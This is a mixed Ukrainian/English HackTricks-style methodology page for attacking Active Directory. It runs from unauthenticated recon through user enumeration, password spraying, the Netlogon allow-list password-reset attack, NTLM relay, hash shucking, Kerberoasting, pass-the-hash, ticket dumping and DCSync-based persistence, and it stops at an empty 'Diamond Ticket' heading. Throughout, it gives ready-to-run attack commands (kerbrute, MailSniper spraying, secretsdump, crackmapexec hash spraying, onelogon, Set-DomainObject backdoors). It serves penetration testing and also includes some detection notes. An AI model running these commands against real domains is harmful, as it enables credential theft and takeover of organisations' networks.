# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Базовий огляд

**Active Directory** є фундаментальною технологією, що дає змогу **network administrators** ефективно створювати та керувати **domains**, **users** і **objects** у мережі. Вона спроєктована для масштабування, забезпечуючи організацію великої кількості користувачів у керовані **groups** і **subgroups**, водночас контролюючи **access rights** на різних рівнях.

Структура **Active Directory** складається з трьох основних рівнів: **domains**, **trees** і **forests**. **Domain** охоплює набір об'єктів, таких як **users** або **devices**, які спільно використовують одну базу даних. **Trees** — це групи таких domain, пов'язані спільною структурою, а **forest** представляє сукупність кількох trees, поєднаних через **trust relationships**, утворюючи найвищий рівень організаційної структури. На кожному з цих рівнів можуть бути визначені окремі **access** і **communication rights**.

Основні поняття в **Active Directory**:

1. **Directory** – містить усю інформацію, що стосується об'єктів Active Directory.
2. **Object** – позначає сутності в directory, зокрема **users**, **groups** або **shared folders**.
3. **Domain** – слугує контейнером для directory objects, причому кілька domains можуть співіснувати в межах **forest**, і кожен зберігає власний набір objects.
4. **Tree** – група domains, що мають спільний root domain.
5. **Forest** – вершина організаційної структури в Active Directory, що складається з кількох trees із **trust relationships** між ними.

**Active Directory Domain Services (AD DS)** охоплює набір сервісів, критично важливих для централізованого керування та взаємодії в мережі. Ці сервіси включають:

1. **Domain Services** – централізує зберігання даних і керує взаємодією між **users** та **domains**, зокрема **authentication** і **search** функціональність.
2. **Certificate Services** – керує створенням, розповсюдженням і адмініструванням захищених **digital certificates**.
3. **Lightweight Directory Services** – підтримує directory-enabled applications через **LDAP protocol**.
4. **Directory Federation Services** – надає можливості **single-sign-on** для автентифікації users у кількох web applications за одну сесію.
5. **Rights Management** – допомагає захищати copyright material, регулюючи його несанкціоноване розповсюдження та використання.
6. **DNS Service** – критично важливий для розв'язання **domain names**.

Для детальнішого пояснення дивіться: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Щоб навчитися, як **attack an AD**, потрібно дуже добре **understand** процес **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

- **Pentest the network:**
- Scan the network, find machines and open ports and try to **exploit vulnerabilities** or **extract credentials** from them (for example, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerating DNS could give information about key servers in the domain as web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Take a look to the General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) to find more information about how to do this.
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- A more detailed guide on how to enumerate a SMB server can be found here:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.
- If you find the complete names of company workers, you could try different AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). The most common conventions are: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
- **No Authentication against MS-NRPC**: Using auth-level = 1 (No authentication) against the MS-NRPC (Netlogon) interface on domain controllers. The method calls the `DsrGetDcNameEx2` function after binding MS-NRPC interface to check if the user or computer exists without any credentials. The [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implements this type of enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Якщо ви знайшли один із цих серверів у мережі, ви також можете виконати **user enumeration** проти нього. Наприклад, ви можете використати інструмент [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Ви можете знайти списки usernames у [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  і в цьому ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Even after **Zerologon** is patched on the DC, explicitly allow-listed accounts can still be exposed to **legacy/vulnerable Netlogon secure-channel behavior**. The risky configuration is the GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** or the matching registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

That value is an **SDDL security descriptor** (see [Security Descriptors](security-descriptors.md)). Any account or group granted the relevant ACE in the DACL can be targeted. For example, `O:BAG:BAD:(A;;RC;;;WD)` effectively allow-lists **Everyone**.

Practical operator workflow:

1. **Identify allow-listed principals** by checking both **SYSVOL/GPO** and the **live DC registry**.
2. **Resolve SIDs** found in the SDDL to real AD users/computers and prioritize **DC machine accounts**, **trust accounts**, and other privileged machines.
3. Repeatedly attempt **MS-NRPC / Netlogon authentication** as the allow-listed account.
4. After a successful guess, abuse **Netlogon password-setting** to reset the target account password (the public PoC sets it to an empty string).

Quick triage / lab examples from the public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- **scanner** корисний, бо ефективний allow-list може існувати в **SYSVOL**, у **registry**, або в обох.
- Сам шлях експлуатації важливий, бо він **не потребує привілеїв Domain Admin** після того, як уразливий account було ідентифіковано.
- Компрометація облікового запису машини **Domain Controller** на кшталт `DC$` особливо небезпечна, бо скидання цього пароля може безпосередньо увімкнути ширші шляхи **AD takeover**.
- Здійсненність **brute-force** залежить від режиму: публічний artifact описує підхід meet-in-the-middle, **24-bit** brute force, коли доступний інший computer account, і повільніші **32-bit** варіанти.

Detection / hardening notes:

- Audit allow-list policy і приберіть усе, окрім тимчасових, явно потрібних compatibility exceptions.
- Моніторте DC **System** events **5827/5828/5829/5830/5831**, щоб виявляти denied, discovered або явно дозволені policy vulnerable Netlogon connections.
- Розглядайте account'и у `VulnerableChannelAllowList` як **high-risk** доти, доки legacy dependency не буде усунено.

### Knowing one or several usernames

Ok, отже, ви вже знаєте, що маєте valid username, але без passwords... Тоді спробуйте:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Спробуймо най**common passwords** для кожного з виявлених users, можливо, хтось використовує слабкий password (майте на увазі password policy!).
- Зверніть увагу, що ви також можете **spray OWA servers** щоб спробувати отримати доступ до mail servers користувачів.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ви можете **obtain** деякі challenge **hashes** для crack, виконуючи **poisoning** деяких protocols **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Якщо вам вдалося enumerate active directory, у вас буде **more emails and a better understanding of the network**. Ви можете примусити NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  щоб отримати доступ до AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** щоб зберігати стан AD recon для кожного engagement: `workspace create <name>` створює per-protocol SQLite DBs у `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Перемикайте перегляд через `proto smb|mssql|winrm` і переглядайте зібрані secrets через `creds`. Після завершення вручну видаліть sensitive data: `rm -rf ~/.nxc/workspaces/<name>`.
- Швидке subnet discovery за допомогою **`netexec smb <cidr>`** показує **domain**, **OS build**, **SMB signing requirements**, і **Null Auth**. Members, що мають `(signing:False)`, є **relay-prone**, тоді як DCs часто вимагають signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Коли **SMB relay до DC заблоковано** через signing, все одно перевіряй **LDAP** posture: `netexec ldap <dc>` підсвічує `(signing:None)` / weak channel binding. DC з увімкненим SMB signing, але вимкненим LDAP signing, лишається придатною ціллю **relay-to-LDAP** для abuses на кшталт **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs інколи **вбудовують masked admin passwords в HTML**. Перегляд source/devtools може показати cleartext (наприклад, `<input value="<password>">`), що дає Basic-auth доступ до scan/print repositories.
- Retrieved print jobs можуть містити **plaintext onboarding docs** з per-user passwords. Під час testing тримай pairing aligned:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Якщо вам вдалося перелічити active directory, у вас буде **більше email-ів і краще розуміння мережі**. Ви можете змусити NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Пошук Creds у Computer Shares | SMB Shares

Тепер, коли у вас є базові credentials, слід перевірити, чи можете ви **знайти** якісь **цікаві файли, що розшарені всередині AD**. Ви можете зробити це вручну, але це дуже нудне повторюване завдання (і ще гірше, якщо ви знайдете сотні документів, які потрібно перевірити).

[**Перейдіть за цим посиланням, щоб дізнатися про tools, які ви можете використовувати.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Якщо ви можете **отримати доступ до інших ПК або shares**, ви можете **розмістити файли** (наприклад, SCF file), які, якщо до них якимось чином звернуться, **trigger NTLM authentication проти вас**, щоб ви могли **steal** **NTLM challenge** і зламати його:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця vulnerability дозволяла будь-якому authenticated user **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Для наведених нижче techniques звичайного domain user недостатньо, вам потрібні певні special privileges/credentials, щоб виконати ці attacks.**

### Hash extraction

Сподіваємося, вам вдалося **compromise some local admin** account за допомогою [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Тоді настав час витягнути всі hashes з пам’яті та локально.\
[**Прочитайте цю сторінку про різні способи отримання hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Після того як ви маєте hash користувача**, ви можете використати його, щоб **імперсонавати** його.\
Вам потрібно використати певний **tool**, який **виконає** **NTLM authentication using** цього **hash**, **або** ви можете створити новий **sessionlogon** і **inject** цей **hash** у **LSASS**, щоб коли виконується будь-яка **NTLM authentication**, використовувався саме **цей hash**. Останній варіант — це те, що робить mimikatz.\
[**Прочитайте цю сторінку для отримання додаткової інформації.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ця атака спрямована на **використання user NTLM hash для запиту Kerberos tickets** як альтернативи поширеному Pass The Hash через NTLM protocol. Тому це може бути особливо **корисно в мережах, де NTLM protocol вимкнено** і як authentication protocol дозволено лише **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

У методі атаки **Pass The Ticket (PTT)** attackers **steal authentication ticket користувача** замість його password або hash values. Потім цей викрадений ticket використовується для **імперсонації користувача**, надаючи несанкціонований доступ до ресурсів і services у межах мережі.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Якщо у вас є **hash** або **password** **local administrator**, вам слід спробувати **увійти локально** на інші **PCs** з їх допомогою.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Зауважте, що це досить **noisy** і **LAPS** може це **mitigate**.

### MSSQL Abuse & Trusted Links

Якщо користувач має привілеї для **access MSSQL instances**, він може **execute commands** на хості MSSQL (якщо він працює як SA), **steal** NetNTLM **hash** або навіть виконати **relay** **attack**.\
Також, якщо екземпляр MSSQL є trusted (database link) іншим екземпляром MSSQL. Якщо користувач має привілеї над довіреною базою даних, він зможе **use the trust relationship to execute queries also in the other instance**. Ці trust можуть бути chained, і в якийсь момент користувач може знайти misconfigured database, де він зможе execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Сторонні інвентаризаційні та deployment suites часто відкривають потужні шляхи до credentials і code execution. Дивіться:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знайдете будь-який Computer object з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і маєте domain privileges на комп'ютері, ви зможете dump TGTs з пам'яті кожного користувача, що logins onto the computer.\
Отже, якщо **Domain Admin logins onto the computer**, ви зможете dump його TGT і impersonate його, використовуючи [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation ви навіть можете **automatically compromise a Print Server** (сподіваємося, це буде DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо користувач або комп'ютер allowed для "Constrained Delegation", він зможе **impersonate any user to access some services in a computer**.\
Тоді, якщо ви **compromise the hash** цього користувача/комп'ютера, ви зможете **impersonate any user** (навіть domain admins) для доступу до деяких services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Маючи привілей **WRITE** на об'єкті Active Directory віддаленого комп'ютера, можна отримати code execution з **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Компрометований користувач може мати деякі **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Виявлення **Spool service listening** у межах домену може бути **abused** для **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Якщо **other users** **access** **compromised** machine, можна **gather credentials from memory** і навіть **inject beacons in their processes** щоб impersonate them.\
Зазвичай користувачі отримують доступ до системи через RDP, тож тут показано, як провести кілька атак на third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** надає систему для керування **local Administrator password** на комп'ютерах, приєднаних до домену, забезпечуючи, що він **randomized**, унікальний і часто **changed**. Ці паролі зберігаються в Active Directory, а доступ до них контролюється через ACL лише для authorized users. Маючи достатні permissions для доступу до цих паролів, стає можливим pivoting до інших комп'ютерів.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** з компрометованої машини може бути способом підвищити привілеї всередині середовища:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Якщо налаштовані **vulnerable templates**, їх можна abused для підвищення привілеїв:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Щойно ви отримаєте **Domain Admin** або ще краще **Enterprise Admin** privileges, ви зможете **dump** **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Деякі з технік, описаних вище, можна використовувати для persistence.\
Наприклад, ви можете:

- Зробити користувачів vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Зробити користувачів vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Надати [**DCSync**](#dcsync) privileges користувачу

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** створює **legitimate Ticket Granting Service (TGS) ticket** для конкретного service, використовуючи **NTLM hash** (наприклад, **hash облікового запису PC**). Цей метод використовується для **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** полягає в тому, що attacker отримує доступ до **NTLM hash of the krbtgt account** у середовищі Active Directory (AD). Цей обліковий запис особливий, тому що він використовується для підпису всіх **Ticket Granting Tickets (TGTs)**, які необхідні для authenticating у мережі AD.

Щойно attacker отримує цей hash, він може створювати **TGTs** для будь-якого облікового запису за власним вибором (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

